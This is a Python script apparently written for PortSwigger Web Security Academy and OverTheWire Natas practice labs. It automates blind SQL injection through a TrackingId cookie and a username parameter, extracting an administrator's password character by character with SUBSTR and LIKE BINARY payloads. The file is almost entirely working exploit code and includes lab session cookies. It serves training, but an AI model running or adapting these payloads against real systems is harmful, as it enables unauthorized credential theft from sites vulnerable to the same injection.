#Find password

import requests
from string import ascii_letters, digits
import json

#Cookie: TrackingId=3jCksXJLxE0xk7qV; session=lognPnBw8eSIlAxwNs0EqDjPATPoSgai

#URL and headers
url = "https://0a0700e403d6688580f180b2003a003b.web-security-academy.net/login"
#auth = ("user", "password")  #Update with correct credentials
headers_from_burp = """
Host: 0a0700e403d6688580f180b2003a003b.web-security-academy.net
Cookie: TrackingId=3jCksXJLxE0xk7qV; session=lognPnBw8eSIlAxwNs0EqDjPATPoSgai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0700e403d6688580f180b2003a003b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers

"""

def burp_header_to_dict(headers_from_burp, delete_cookies=False):
    headers=""
    for line in headers_from_burp.splitlines():
        if line != "":
            if not delete_cookies or not "Cookie" in line:
                line = "\""+line+"\","
                line = line.replace(": ","\": \"")
                headers = headers + line
    return json.loads("{"+headers[:-1]+"}")


def check_password_complete_params(password): #Update to your payload
    payload = f'a1d2m3i4n5" union select 1,2 from users where username="natas16" and password = "{password}";-- -'
    params = {"username": payload}
    response = requests.get(url, headers=headers, params=params)#, auth=auth)
    return "This user exists" in response.text

def test_possible_password_part_params(test_password): #Update to your payload
    payload = f'a1d2m3i4n5" union select 1,2 from users where username="natas16" and password like binary "{test_password}%";-- -'
    params = {"username": payload}
    response = requests.get(url, headers=headers, params=params)#, auth=auth)
    return "This user exists" in response.text


cookie_payload_string1 = f"' and (SELECT password FROM users WHERE username = 'administrator')"

def test_possible_password_part_cookies(test_password): #Update to your payload
    cookie_payload_string2 = f"' and SUBSTR((SELECT password FROM users WHERE username = 'administrator'), "+str(password_position)+", 1)"
    #payload = cookie_payload_string1 + f" like binary '{test_password}%"
    payload = cookie_payload_string2 + f" = '{test_password}"
    print(payload)
    return password_tests_cookies(payload)

def check_password_complete_cookies(password): #Update to your payload
    payload = cookie_payload_string1 + f" = '{password}"
    return password_tests_cookies(payload)


def password_tests_cookies(payload):
    cookies = dict(TrackingId="3jCksXJLxE0xk7qV"+payload, session="lognPnBw8eSIlAxwNs0EqDjPATPoSgai")
    response = requests.get(url, headers=headers, cookies=cookies) #, auth=auth)
    return "Welcome back!" in response.text


characters = ascii_letters + digits #Characters to try in the password
headers = burp_header_to_dict(headers_from_burp, True)
print(headers)

password = ""
password_position = 1
while True:
    found_char = False
    for char in characters:
        test_password = password + char
        print(test_password)

        #if test_possible_password_part_params(test_password):
        #if test_possible_password_part_cookies(test_password):
        if test_possible_password_part_cookies(char):
            password += char
            found_char = True
            password_position+=1
            print(f"Current password: {password}")

            # Check if the password is complete
            #if check_password_complete_params(password):
            if check_password_complete_cookies(password):
                print(f"Full password found: {password}")
                found_char = False
                break

    if not found_char:
        print("Finished password brute-forcing.")
        break
